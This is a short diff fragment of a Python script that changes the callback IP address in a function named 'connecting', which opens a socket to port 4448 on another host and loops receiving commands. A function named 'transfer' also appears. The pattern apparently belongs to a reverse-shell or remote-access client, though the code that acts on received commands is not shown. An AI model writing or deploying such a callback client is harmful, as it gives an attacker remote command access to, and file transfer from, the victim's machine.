@@ -17,7 +17,7 @@ def transfer(s, path):
 
 def connecting():
     s = socket.socket()
-    s.connect(("192.168.1.24", 4448))
+    s.connect(("192.168.1.23", 4448))
 
     while True:
         command = s.recv(1024)
